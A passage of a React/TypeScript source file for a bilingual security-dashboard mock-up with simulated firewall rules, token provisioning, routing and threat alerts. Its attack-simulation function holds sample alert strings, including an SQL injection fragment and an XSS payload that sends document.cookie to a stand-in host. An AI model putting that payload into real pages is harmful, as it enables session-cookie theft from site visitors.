        type: "MANUAL",
        text: `AUDIT_NOTE: ${customAuditNote}`,
        color: "text-indigo-400 font-semibold"
      };

      setAuditLogsList([newLog, ...auditLogsList]);
      setCustomAuditNote("");
    };

    // 3) Change Firewall Mode
    const handleSetFirewallMode = (mode: "active" | "inspection" | "bypass") => {
      setFwMode(mode);
      const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
      const textMap = {
        active: isRtl ? "تغییر وضعیت فایروال به [مسدودسازی کامل]" : "Firewall status altered to [ACTIVE_DENY]",
        inspection: isRtl ? "تغییر وضعیت فایروال به [کنترل و پایش هوشمند]" : "Firewall status altered to [INTELLIGENT_MONITOR]",
        bypass: isRtl ? "هشدار: تغییر وضعیت فایروال به [غیرفعال / بای‌پس کل ترافیک]" : "CRITICAL_WARN: Firewall status set to [BYPASS_ALL]"
      };
      const colorMap = {
        active: "text-emerald-500 font-bold",
        inspection: "text-amber-500 font-bold",
        bypass: "text-rose-500 font-extrabold animate-pulse"
      };
      
      const sysLog = {
        id: Math.random().toString(),
        time: dateStr,
        type: "FIREWALL_MODE",
        text: textMap[mode],
        color: colorMap[mode]
      };
      setAuditLogsList([sysLog, ...auditLogsList]);
    };

    // 4) Add custom Firewall rule
    const handleAddFirewallRule = (e: React.FormEvent) => {
      e.preventDefault();
      const portVal = fwRulePort.trim() || "ANY";
      const ruleName = isRtl ? `انسداد ترافیک ورودی پورت ${portVal}` : `Restrict inbound traffic on Port ${portVal}`;
      const sourceVal = fwIpToBan.trim() || "ANY";
      
      const newRule = {
        id: "fw_" + Math.random().toString(36).substr(2, 4),
        ruleName,
        source: sourceVal,
        port: portVal,
        protocol: fwRuleProtocol,
        action: fwRuleAction,
        hits: 0,
        status: "active"
      };
      setFwRulesList([...fwRulesList, newRule]);
      
      const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
      const sysLog = {
        id: Math.random().toString(),
        time: dateStr,
        type: "FW_MUTATION",
        text: `FIREWALL_RULE_COMPILE: Active ACL updated. Added target "${sourceVal}:${portVal}" using protocol ${fwRuleProtocol} with response rule ${fwRuleAction}.`,
        color: "text-emerald-400 font-bold"
      };
      setAuditLogsList([sysLog, ...auditLogsList]);
      setFwIpToBan("");
    };

    // 5) Toggle rule state
    const handleToggleRule = (id: string) => {
      setFwRulesList(fwRulesList.map(r => {
        if (r.id === id) {
          const nextStatus = r.status === "active" ? "inactive" : "active";
          const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
          const sysLog = {
            id: Math.random().toString(),
            time: dateStr,
            type: "FW_RULE_STATE",
            text: `FIREWALL_RULE_STATE: Altering policy "${r.ruleName}" status index to ${nextStatus.toUpperCase()}`,
            color: nextStatus === "active" ? "text-emerald-500" : "text-amber-500"
          };
          setAuditLogsList([sysLog, ...auditLogsList]);
          return { ...r, status: nextStatus };
        }
        return r;
      }));
    };

    // 6) Delete rule
    const handleDeleteRule = (id: string) => {
      const match = fwRulesList.find(r => r.id === id);
      if (match) {
        const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
        const sysLog = {
          id: Math.random().toString(),
          time: dateStr,
          type: "FW_DELETE",
          text: `FIREWALL_RULE_PURGE: Deleted firewall policy: "${match.ruleName}". ACL chain table re-indexed.`,
          color: "text-rose-400"
        };
        setAuditLogsList([sysLog, ...auditLogsList]);
      }
      setFwRulesList(fwRulesList.filter(r => r.id !== id));
    };

    // 7) Create access credential token
    const handleCreateToken = (e: React.FormEvent) => {
      e.preventDefault();
      if (!tokClient.trim()) return;

      const randomHex = Math.random().toString(36).substr(2, 8).toUpperCase();
      const mockKey = `sk_live_${tokType.substring(0, 4)}_${Math.random().toString(36).substr(2, 7)}${Math.random().toString(36).substr(2, 7)}`;
      const clearanceText = tokClearance === "4" ? "Level 4 (System)" : tokClearance === "3" ? "Level 3 (Read-Only)" : tokClearance === "2" ? "Level 2 (Operator)" : "Level 1 (Administrator)";
      
      const newToken = {
        id: "tok_" + Math.random().toString(36).substr(2, 4),
        client: tokClient,
        type: tokType,
        key: `${mockKey.substring(0, 15)}...${mockKey.substring(mockKey.length - 4)}`,
        clearance: clearanceText,
        algo: tokAlgo,
        created: new Date().toISOString().replace('T', ' ').substring(0, 16),
        status: "active"
      };
      
      setTokensList([newToken, ...tokensList]);

      const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
      const sysLog = {
        id: Math.random().toString(),
        time: dateStr,
        type: "TOK_PROVIS",
        text: `CREDENTIAL_PROVISIONED: Registered token credentials for "${tokClient}". Protocol: ${tokAlgo}, Cryptographic Hash Signature validation code: sha256_${randomHex}. Clearance Assigned: "${clearanceText}".`,
        color: "text-indigo-400 font-semibold"
      };
      setAuditLogsList([sysLog, ...auditLogsList]);
      setTokClient("");
    };

    // 8) Toggle Token State
    const handleToggleToken = (id: string) => {
      setTokensList(tokensList.map(t => {
        if (t.id === id) {
          const nextStatus = t.status === "active" ? "revoked" : "active";
          const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
          const sysLog = {
            id: Math.random().toString(),
            time: dateStr,
            type: "TOK_STATE",
            text: `CREDENTIAL_MUTATION: Revoked/Altered API credential key "${t.client}" to status index ${nextStatus.toUpperCase()}. Session pools dropped.`,
            color: nextStatus === "active" ? "text-emerald-500" : "text-rose-500 font-bold"
          };
          setAuditLogsList([sysLog, ...auditLogsList]);
          return { ...t, status: nextStatus };
        }
        return t;
      }));
    };

    // 9) Delete Token
    const handleDeleteToken = (id: string) => {
      const match = tokensList.find(t => t.id === id);
      if (match) {
        const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
        const sysLog = {
          id: Math.random().toString(),
          time: dateStr,
          type: "TOK_PURGE",
          text: `CREDENTIAL_PURGE: Entirely wiped credential authorization key: "${match.client}". Access token registers freed.`,
          color: "text-rose-400"
        };
        setAuditLogsList([sysLog, ...auditLogsList]);
      }
      setTokensList(tokensList.filter(t => t.id !== id));
    };

    // 10) Add system static route path
    const handleAddRoute = (e: React.FormEvent) => {
      e.preventDefault();
      if (!routeDest.trim() || !routeGw.trim()) return;

      const newRoute = {
        id: "rt_" + Math.random().toString(36).substr(2, 4),
        destination: routeDest,
        gateway: routeGw,
        interface: routeIface,
        metric: Number(routeMetric) || 10,
        priority: routePriority,
        status: "online"
      };

      setRoutesList([...routesList, newRoute]);

      const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
      const sysLog = {
        id: Math.random().toString(),
        time: dateStr,
        type: "ROUTING_ADD",
        text: `ROUTING_DESCRIPT: Added static TCP routing path over interface adaptor: Subnet destination: ${routeDest} via gateway: ${routeGw} Metric index: ${routeMetric} (Metric Priority: ${routePriority}).`,
        color: "text-amber-500 font-semibold"
      };
      setAuditLogsList([sysLog, ...auditLogsList]);
      setRouteDest("");
      setRouteGw("");
    };

    // 11) Delete route
    const handleDeleteRoute = (id: string) => {
      const match = routesList.find(r => r.id === id);
      if (match) {
        const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
        const sysLog = {
          id: Math.random().toString(),
          time: dateStr,
          type: "ROUTE_PURGE",
          text: `ROUTING_DESCRIPT_PERM: Static IP routing path ${match.destination} purged. System Gateway routing adapter refreshed.`,
          color: "text-rose-400"
        };
        setAuditLogsList([sysLog, ...auditLogsList]);
      }
      setRoutesList(routesList.filter(r => r.id !== id));
    };

    // 12) Live network Hop diagnostic verification simulator
    const handleRunPingDiagnostic = () => {
      if (!routePingIp.trim()) return;
      setRoutePingRunning(true);
      setRoutePingLog([isRtl ? `شروع عیب‌یابی مسیر به مقصد ${routePingIp}...` : `Tracing gateway hop vectors to ${routePingIp}...`]);
      
      let step = 0;
      const logs = [
        `PING ${routePingIp} (${routePingIp}) 56(84) bytes of data.`,
        `[HOP 1] 193.12.99.1 (Gateway IP) - seq=0 - rtt=1.05 ms - Interface: eth0 (OK)`,
        `[HOP 2] 10.0.12.254 (Autonomous System AS20473 hops) - seq=1 - rtt=4.22 ms (OK)`,
        `[HOP 3] 172.250.84.19 (CyberShield Backbone) - seq=2 - rtt=10.15 ms - TLS Encrypted Tunnel IPsec (OK)`,
        `[HOP 4] ${routePingIp} (Destination Target Resolved) - seq=3 - rtt=18.41 ms - Gateway metrics verified (Path Trace Completed)`
      ];

      const interval = setInterval(() => {
        if (step < logs.length) {
          setRoutePingLog((prev) => [...prev, logs[step]]);
          const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
          const sysLog = {
            id: Math.random().toString(),
            time: dateStr,
            type: "NETWORK_TRACE",
            text: `TRACE_DIAGNOSTIC: Route verification on host address ${routePingIp} matched hop packet: "${logs[step]}".`,
            color: "text-cyan-400 text-xs"
          };
          setAuditLogsList((prev) => [sysLog, ...prev]);
          step++;
        } else {
          setRoutePingRunning(false);
          clearInterval(interval);
        }
      }, 700);
    };

    // 13) Simulated attacker intercept trigger
    const handleInjectAttackSimulation = () => {
      const dateStr = new Date().toISOString().replace('T', ' ').substring(0, 19);
      const randomIp = ["185.190.140.99", "103.24.11.230", "5.188.210.145", "119.23.44.88", "195.201.201.7"][Math.floor(Math.random() * 5)];
      const randomThreat = [
        `FIREWALL_DENY: Malicious SQL-Injection pattern "UNION SELECT ALL Password, Hash FROM user_accounts" analyzed on target IP ${randomIp}. Threat dropping block invoked.`,
        `CORE_INTRUSION: Root socket terminal brute-force detected from TOR network IP ${randomIp}. Intercepting biometric credentials challenges...`,
        `DDoS_REFLECTION: Volumetric UDP amplification flood tracked on port 53 DNS from host ${randomIp}. Core route rate limit limits applied (Dropped 1024 packets/sec).`,
        `XSS_INJECT: Malicious script tags "<script>fetch('http://exploit.io/cookie?c='+document.cookie)</script>" detected inside transaction api. Hardware fingerprint blocked.`
      ][Math.floor(Math.random() * 4)];

      const sysLog = {
        id: Math.random().toString(),
        time: dateStr,
        type: "CORE_SEC_ALERT",
        text: randomThreat,
        color: "text-rose-500 font-extrabold animate-pulse"
      };

      setAuditLogsList([sysLog, ...auditLogsList]);

      if (fwRulesList.every(r => r.source !== randomIp)) {
        const autoRule = {
          id: "fw_auto_" + Math.random().toString(36).substr(2, 4),
          ruleName: isRtl ? `انسداد خودکار تهدید سایبری ${randomIp}` : `Auto Threat Dropper: IP ${randomIp}`,
          source: randomIp,
          port: "ALL",
          protocol: "ALL" as any,
          action: "BLOCK" as any,
          hits: 15,
          status: "active"
        };
        setFwRulesList(prev => [...prev, autoRule]);
      }
    };

    // Log filter
    const filteredLogs = auditLogsList.filter((log) => {
      return log.text.toLowerCase().includes(auditLogsSearch.toLowerCase()) ||
             log.type.toLowerCase().includes(auditLogsSearch.toLowerCase());
    });

    return (
      <div className="p-4 md:p-6 space-y-6 text-right ltr:text-left" dir={isRtl ? "rtl" : "ltr"}>
        {/* SECTION HEADER */}
        <div className="flex flex-col md:flex-row justify-between md:items-center border-b border-dash-border/40 pb-4 gap-4">
          <div>
            <h2 className="text-xl font-bold text-white flex items-center gap-2">
              <Terminal className="w-5 h-5 text-indigo-400" />
              {isRtl ? "گزارش حسابرسی و امنیت هسته سیستم" : "System Kernels & Audit Logs Console"}
            </h2>
            <p className="text-xs text-slate-500 mt-1">
              {isRtl 
                ? "کنسول بررسی رویدادهای فایروال، ثبت توکن‌های دسترسی و عملیات روتینگ سیستمی تخصصی" 
                : "Advanced centralized operational control documenting system transaction ledgers, active ACLs, and route structures."}
            </p>
          </div>
          <div className="flex items-center gap-2 shrink-0">
            <button
              onClick={handleInjectAttackSimulation}
              className="px-3.5 py-1.5 bg-rose-500/10 hover:bg-rose-500/25 border border-rose-500/30 text-rose-400 text-xs font-bold rounded-lg cursor-pointer flex items-center gap-1.5 transition-all uppercase"
            >
              <Activity className="w-3.5 h-3.5" />
              {isRtl ? "شبیه‌سازی حمله امنیتی" : "SIMULATE THREAT ATTACK"}
            </button>
            <button
              onClick={handleClearLogs}
              className="px-3.5 py-1.5 bg-slate-900 hover:bg-slate-800 border border-slate-700/50 text-slate-300 text-xs font-bold rounded-lg cursor-pointer transition-all shrink-0"
            >
              {isRtl ? "پاک کردن ترمینال" : "CLEAR LOG TERMINAL"}
            </button>
          </div>
        </div>

        {/* HIGH-TECH OPERATIONAL STATS SUMMARY BAR */}
        <div className="grid grid-cols-2 lg:grid-cols-4 gap-4">
          <div className="bg-[#0c1224] border border-[#1d273d] rounded-xl p-4 flex flex-col justify-between">
            <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">{isRtl ? "۱. هسته فایروال" : "1. FIREWALL MODE"}</span>
            <div className="mt-2 flex items-center justify-between">
              <span className={cn(
                "text-xs font-mono font-extrabold px-2.5 py-1 rounded border",
                fwMode === "active" ? "bg-emerald-500/10 text-emerald-400 border-emerald-500/30" :
                fwMode === "inspection" ? "bg-amber-500/10 text-amber-400 border-amber-500/30" :
                "bg-rose-500/10 text-rose-400 border-rose-500/30 animate-pulse"
              )}>
                {fwMode === "active" ? (isRtl ? "مسدودسازی کامل" : "ACTIVE BLOCK") :
                 fwMode === "inspection" ? (isRtl ? "پایش هوشمند" : "INSPECT ONLY") :
                 (isRtl ? "بای‌پس کامل" : "BYPASS TRAFFIC")}
              </span>
              <ShieldCheck className="w-4 h-4 text-emerald-400" />
            </div>
          </div>

          <div className="bg-[#0c1224] border border-[#1d273d] rounded-xl p-4 flex flex-col justify-between">
            <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">{isRtl ? "۲. توکن‌های ثبت‌شده" : "2. PROVISIONED TOKENS"}</span>
            <div className="mt-2 flex items-center justify-between">
              <span className="text-xl font-mono font-black text-white">{tokensList.filter(t => t.status === "active").length} <span className="text-xs text-slate-500 font-normal">/ {tokensList.length}</span></span>
              <Lock className="w-4 h-4 text-indigo-400" />
            </div>
          </div>

          <div className="bg-[#0c1224] border border-[#1d273d] rounded-xl p-4 flex flex-col justify-between">
            <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">{isRtl ? "۳. گیت‌وی و مسیرها" : "3. ACTIVE SYSTEM GATEWAYS"}</span>
            <div className="mt-2 flex items-center justify-between">
              <span className="text-xl font-mono font-black text-white">{routesList.length} <span className="text-xs text-slate-500 font-normal">LAN</span></span>
              <Route className="w-4 h-4 text-amber-500" />
            </div>
          </div>

          <div className="bg-[#0c1224] border border-[#1d273d] rounded-xl p-4 flex flex-col justify-between">
            <span className="text-[11px] font-bold text-slate-400 uppercase tracking-wider">{isRtl ? "۴. راستی‌آزمایی رمزنگاری" : "4. CRYPTO SHA256 INTEGRITY"}</span>
            <div className="mt-2 flex items-center justify-between">
              <div className="flex items-center gap-1">
                <span className="w-2 h-2 rounded-full bg-emerald-500 animate-ping" />
                <span className="text-xs font-bold text-emerald-400 font-mono">100% SECURE</span>
              </div>
              <Cpu className="w-4 h-4 text-slate-400" />
            </div>
          </div>
        </div>

        {/* CONTROLS SWITCHER AND FORMS HUB */}
        <div className="bg-[#111625] border border-dash-border/60 rounded-xl overflow-hidden shadow-2xl">
          {/* TAB BAR FOR COMPONENT CONTROLS */}
          <div className="bg-[#0b0f19] border-b border-dash-border/50 flex flex-wrap">
            <button
              onClick={() => setAuditLogsSubTab("firewall")}
              className={cn(
                "px-5 py-3 text-xs font-bold flex items-center gap-2 border-b-2 transition-all cursor-pointer",
                auditLogsSubTab === "firewall" 
                  ? "border-emerald-500 text-white bg-emerald-500/[0.04]" 
                  : "border-transparent text-slate-400 hover:text-slate-200"
              )}
            >
              <Sliders className="w-4 h-4 text-emerald-400" />
              {isRtl ? "کنسول بررسی رویدادهای فایروال" : "Firewall Rules & Security Console"}
            </button>
            <button
              onClick={() => setAuditLogsSubTab("tokens")}
              className={cn(
                "px-5 py-3 text-xs font-bold flex items-center gap-2 border-b-2 transition-all cursor-pointer",
                auditLogsSubTab === "tokens" 
                  ? "border-indigo-500 text-white bg-indigo-500/[0.04]" 
                  : "border-transparent text-slate-400 hover:text-slate-200"
              )}
            >
              <Fingerprint className="w-4 h-4 text-indigo-400" />
              {isRtl ? "ثبت کلید و توکن‌های دسترسی" : "Provision & Authorize Tokens"}
            </button>
            <button
              onClick={() => setAuditLogsSubTab("routing")}
              className={cn(
                "px-5 py-3 text-xs font-bold flex items-center gap-2 border-b-2 transition-all cursor-pointer",
                auditLogsSubTab === "routing" 
                  ? "border-amber-500 text-white bg-amber-500/[0.04]" 
                  : "border-transparent text-slate-400 hover:text-slate-200"
              )}
            >
              <Route className="w-4 h-4 text-amber-400" />
              {isRtl ? "عملیات روتینگ سیستمی" : "Gatekeeper Routing Matrices"}
            </button>
          </div>

          <div className="p-5">
            {/* SUBTAB 1: FIREWALL CONTROL */}
            {auditLogsSubTab === "firewall" && (
              <div className="space-y-6">
                <div className="flex flex-col md:flex-row gap-6 justify-between items-start md:items-center bg-slate-950 p-4 rounded-xl border border-slate-900/40">
                  <div>
                    <h3 className="text-slate-200 font-bold text-sm">{isRtl ? "کنترل سراسری سطح حفاظت فایروال سایبری" : "Global Cyber Firewall Enforcement"}</h3>
                    <p className="text-[11px] text-slate-500 mt-0.5">{isRtl ? "مکانیزم رفتاری فیلتر بسته‌های ورودی شبکه" : "Determine strictness profiles of packet filter and deep behavioral logs."}</p>
                  </div>
                  <div className="flex bg-[#0b0f19] p-1 rounded-lg border border-slate-800 gap-1 w-full md:w-auto">
                    <button 
                      onClick={() => handleSetFirewallMode("active")}
                      className={cn(
                        "flex-1 md:flex-none px-3 py-1.5 text-[10px] font-black uppercase rounded cursor-pointer transition-all",
                        fwMode === "active" ? "bg-emerald-500/20 text-emerald-400 border border-emerald-500/40" : "text-slate-500 hover:text-slate-300"
                      )}
                    >
                      {isRtl ? "مسدودسازی کامل" : "BLOCK"}
                    </button>
                    <button 
                      onClick={() => handleSetFirewallMode("inspection")}
                      className={cn(
                        "flex-1 md:flex-none px-3 py-1.5 text-[10px] font-black uppercase rounded cursor-pointer transition-all",
                        fwMode === "inspection" ? "bg-amber-500/20 text-amber-400 border border-amber-500/40" : "text-slate-500 hover:text-slate-300"
                      )}
                    >
                      {isRtl ? "کنترل پایش" : "INSPECT"}
                    </button>
                    <button 
                      onClick={() => handleSetFirewallMode("bypass")}
                      className={cn(
                        "flex-1 md:flex-none px-3 py-1.5 text-[10px] font-black uppercase rounded cursor-pointer transition-all",
                        fwMode === "bypass" ? "bg-rose-500/20 text-rose-400 border border-rose-500/40 animate-pulse" : "text-slate-500 hover:text-slate-300"
                      )}
                    >
                      {isRtl ? "بای‌پس کامل" : "BYPASS"}
                    </button>
                  </div>
                </div>

                <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
                  {/* Firewal rule form */}
                  <div className="xl:col-span-5 bg-slate-950 border border-slate-900 p-5 rounded-xl space-y-4">
                    <div>
                      <h4 className="text-white font-bold text-xs flex items-center gap-1">{isRtl ? "افزودن دستی سیاست مسدودسازی" : "Inject Manual Policy Constraint"}</h4>
                      <p className="text-[10px] text-slate-500 mt-1">{isRtl ? "بستن درگاه خاص یا مسدود کردن آی‌پی متخاصم کلاینت" : "Filter direct IP subnet segments or ports instantly."}</p>
                    </div>

                    <form onSubmit={handleAddFirewallRule} className="space-y-4 text-left font-mono text-xs">
                      <div className="space-y-1">
                        <label className="text-[10px] text-slate-500 uppercase tracking-widest block text-right">{isRtl ? "آدرس آی‌پی هدف (یا ANY)" : "Target Subnet / Source IP"}</label>
                        <input
                          type="text"
                          value={fwIpToBan}
                          onChange={(e) => setFwIpToBan(e.target.value)}
                          placeholder="e.g. 185.220.101.99"
                          className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <div className="space-y-1">
                          <label className="text-[10px] text-slate-500 uppercase tracking-widest block text-right">{isRtl ? "پورت شبکه" : "Local Target Port"}</label>
                          <input
                            type="text"
                            value={fwRulePort}
                            onChange={(e) => setFwRulePort(e.target.value)}
                            placeholder="e.g. 443"
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                          />
                        </div>
                        <div className="space-y-1">
                          <label className="text-[10px] text-slate-500 uppercase tracking-widest block text-right">{isRtl ? "پروتکل" : "Socket Protocol"}</label>
                          <select
                            value={fwRuleProtocol}
                            onChange={(e: any) => setFwRuleProtocol(e.target.value)}
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-emerald-500"
                          >
                            <option value="TCP">TCP</option>
                            <option value="UDP">UDP</option>
                            <option value="ICMP">ICMP</option>
                          </select>
                        </div>
                      </div>

                      <div className="space-y-2">
                        <label className="text-[10px] text-slate-500 uppercase tracking-widest block text-right">{isRtl ? "عمل فایروال (Action)" : "Rule Enforcement Enforcement"}</label>
                        <div className="grid grid-cols-3 gap-2">
                          {["BLOCK", "ALLOW", "CHALLENGE"].map((act) => (
                            <button
                              key={act}
                              type="button"
                              onClick={() => setFwRuleAction(act as any)}
                              className={cn(
                                "py-1.5 rounded text-[10px] font-bold uppercase transition-all",
                                fwRuleAction === act 
                                  ? "bg-emerald-500 text-black shadow-md font-extrabold" 
                                  : "bg-[#0c1224] border border-slate-800 hover:border-slate-700 text-slate-400"
                              )}
                            >
                              {act === "BLOCK" ? (isRtl ? "مسدود" : "BLOCK") : act === "ALLOW" ? (isRtl ? "مجاز" : "ALLOW") : (isRtl ? "چالش" : "CHALLENGE")}
                            </button>
                          ))}
                        </div>
                      </div>

                      <button
                        type="submit"
                        className="w-full py-2 bg-gradient-to-r from-emerald-600 to-indigo-600 hover:from-emerald-500 hover:to-indigo-500 text-white font-extrabold text-xs uppercase tracking-wider rounded-lg transition-all cursor-pointer"
                      >
                        {isRtl ? "کامپایل و تزریق سیاست فایروال" : "COMPILE & INJECT FIREWALL RULE"}
                      </button>
                    </form>
                  </div>

                  {/* Firewall active rules table */}
                  <div className="xl:col-span-7 bg-slate-950 border border-slate-900 rounded-xl overflow-hidden flex flex-col justify-between">
                    <div className="p-4 border-b border-slate-900 bg-[#080c16]">
                      <h4 className="text-white font-bold text-xs">{isRtl ? "دفتر ثبت قوانین فایروال فعال (ACL Rules Ledger)" : "Active Firewall Policy Rules Access Ledger"}</h4>
                      <p className="text-[10px] text-slate-500 mt-0.5">{isRtl ? "قوانینی که در حال پایش به صورت سخت‌افزاری هستند" : "Enforced criteria verifying inbound connections on routing layers."}</p>
                    </div>

                    <div className="flex-1 overflow-x-auto min-h-[220px]">
                      <table className="w-full text-right ltr:text-left font-mono text-[11px]">
                        <thead>
                          <tr className="bg-[#0c1224] text-slate-500 uppercase text-[9px] border-b border-slate-900 select-none">
                            <th className="p-2.5 text-right">{isRtl ? "شرح قانون" : "Rule Policy Description"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "منبع" : "Source / IP"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "پورت / پروتکل" : "Port/Proto"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "عمل فایروال" : "Action"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "آمار دفعات" : "Hits Trace"}</th>
                            <th className="p-2.5 text-center">{isRtl ? "تنظیمات" : "Controls"}</th>
                          </tr>
                        </thead>
                        <tbody className="divide-y divide-slate-900">
                          {fwRulesList.map((rw) => (
                            <tr key={rw.id} className={cn("hover:bg-[#080d1a] transition-all", rw.status !== "active" && "opacity-40")}>
                              <td className="p-2.5 font-sans font-bold text-white shrink-0">{rw.ruleName}</td>
                              <td className="p-2.5 text-center text-indigo-400 font-bold">{rw.source}</td>
                              <td className="p-2.5 text-center font-mono text-slate-400">{rw.port} / <span className="text-slate-500 text-[9px]">{rw.protocol}</span></td>
                              <td className="p-2.5 text-center">
                                <span className={cn(
                                  "px-1.5 py-0.5 rounded text-[9px] font-extrabold uppercase",
                                  rw.action === "BLOCK" ? "bg-rose-500/10 text-rose-400 border border-rose-500/20" :
                                  rw.action === "CHALLENGE" ? "bg-amber-500/10 text-amber-400 border border-amber-500/20" :
                                  "bg-emerald-500/10 text-emerald-400 border border-emerald-500/20"
                                )}>
                                  {rw.action === "BLOCK" ? (isRtl ? "مسدود" : "BLOCK") : rw.action === "CHALLENGE" ? (isRtl ? "چالش" : "CHALLENGE") : (isRtl ? "مجاز" : "ALLOW")}
                                </span>
                              </td>
                              <td className="p-2.5 text-center text-slate-500 text-[10px]">{rw.hits.toLocaleString()}</td>
                              <td className="p-2.5 text-center">
                                <div className="flex justify-center items-center gap-1.5">
                                  <button
                                    onClick={() => handleToggleRule(rw.id)}
                                    className={cn(
                                      "px-1.5 py-0.5 text-[9px] font-bold rounded cursor-pointer",
                                      rw.status === "active" ? "bg-amber-500/10 hover:bg-amber-500/20 text-amber-500" : "bg-emerald-500/10 hover:bg-emerald-500/20 text-emerald-400"
                                    )}
                                  >
                                    {rw.status === "active" ? (isRtl ? "غیرفعال" : "Disable") : (isRtl ? "فعال‌ساز" : "Enable")}
                                  </button>
                                  <button
                                    onClick={() => handleDeleteRule(rw.id)}
                                    className="p-1 text-slate-500 hover:text-rose-400 cursor-pointer transition-all"
                                  >
                                    <Trash2 className="w-3 h-3" />
                                  </button>
                                </div>
                              </td>
                            </tr>
                          ))}
                        </tbody>
                      </table>
                    </div>
                  </div>
                </div>
              </div>
            )}

            {/* SUBTAB 2: ACCESS SECURITY TOKENS */}
            {auditLogsSubTab === "tokens" && (
              <div className="space-y-6">
                <div className="grid grid-cols-1 xl:grid-cols-12 gap-6">
                  {/* Access Token registration Form */}
                  <div className="xl:col-span-5 bg-slate-950 border border-slate-900 p-5 rounded-xl space-y-4">
                    <div>
                      <h4 className="text-white font-bold text-xs flex items-center gap-1">
                        <Fingerprint className="w-4 h-4 text-indigo-400" />
                        {isRtl ? "سامانه ثبت و صدور امنیت توکن دسترسی" : "Provision Secure API Access Token"}
                      </h4>
                      <p className="text-[10px] text-slate-500 mt-1">{isRtl ? "امضای کلید جدید به همراه رنک امنیت دسترسی" : "Define cryptographic strength parameters to register programmatic SDK clients."}</p>
                    </div>

                    <form onSubmit={handleCreateToken} className="space-y-4 font-mono text-xs text-left">
                      <div className="space-y-1">
                        <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "نام کلاینت / سرویس" : "Client / System Identifier Name"}</label>
                        <input
                          type="text"
                          required
                          value={tokClient}
                          onChange={(e) => setTokClient(e.target.value)}
                          placeholder="e.g. Backoffice Daemon Sync"
                          className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-indigo-500"
                        />
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <div className="space-y-1">
                          <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "نوع کلید" : "Token Auth Type"}</label>
                          <select
                            value={tokType}
                            onChange={(e: any) => setTokType(e.target.value)}
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-indigo-500"
                          >
                            <option value="api_key">{isRtl ? "کلید وب‌سرویس (Bearer)" : "Bearer API Key"}</option>
                            <option value="fido2">{isRtl ? "بیومتریک FIDO2" : "FIDO2 Hardware WebAuthn"}</option>
                            <option value="jwt">{isRtl ? "امضای وب توکن (JWT)" : "JWT Encoded payload"}</option>
                            <option value="m2m">{isRtl ? "پروتکل M2M" : "Machine-to-Machine Credentials"}</option>
                          </select>
                        </div>
                        <div className="space-y-1">
                          <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "رنک امنیتی" : "Assigned Privilege Level"}</label>
                          <select
                            value={tokClearance}
                            onChange={(e: any) => setTokClearance(e.target.value)}
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-indigo-500"
                          >
                            <option value="1">{isRtl ? "سطح ۱ (ادمین وب)" : "Level 1 (Web Admin)"}</option>
                            <option value="2">{isRtl ? "سطح ۲ (اپراتور)" : "Level 2 (Operator)"}</option>
                            <option value="3">{isRtl ? "سطح ۳ (فقط خواندنی)" : "Level 3 (Read-Only)"}</option>
                            <option value="4">{isRtl ? "سطح ۴ (سیستمی هسته)" : "Level 4 (Core System)"}</option>
                          </select>
                        </div>
                      </div>

                      <div className="grid grid-cols-2 gap-3">
                        <div className="space-y-1 font-mono">
                          <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "امضای الگوریتم" : "Strength Cipher"}</label>
                          <select
                            value={tokAlgo}
                            onChange={(e: any) => setTokAlgo(e.target.value)}
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-indigo-500"
                          >
                            <option value="SHA-256">SHA-256 (Def)</option>
                            <option value="ECDSA-P256">ECDSA-P256 HMAC (EC)</option>
                            <option value="RSA-4096">RSA-4096 bit crypt</option>
                          </select>
                        </div>
                        <div className="space-y-1">
                          <label className="text-[10px] text-slate-500 uppercase block text-right">{isRtl ? "مدت اعتبار" : "Token Expiry SLA"}</label>
                          <select
                            value={tokDuration}
                            onChange={(e: any) => setTokDuration(e.target.value)}
                            className="w-full bg-[#0c1224] border border-slate-800 rounded-lg p-2 text-xs text-white focus:outline-none focus:border-indigo-500"
                          >
                            <option value="30days">{isRtl ? "۳۰ روزه" : "30 Days TTL"}</option>
                            <option value="1year">{isRtl ? "۱ ساله" : "1 Year TTL"}</option>
                            <option value="never">{isRtl ? "مادام‌العمر (بدون انقضا)" : "Permanent Lease (No Expiry)"}</option>
                          </select>
                        </div>
                      </div>

                      <button
                        type="submit"
                        className="w-full py-2 bg-gradient-to-r from-purple-600 to-indigo-600 hover:from-purple-500 hover:to-indigo-500 text-white font-extrabold text-xs uppercase tracking-wider rounded-lg transition-all cursor-pointer"
                      >
                        {isRtl ? "کامپایل و امضای اعتبارنامه" : "AUTHORIZE NEW SECURITY TOKEN"}
                      </button>
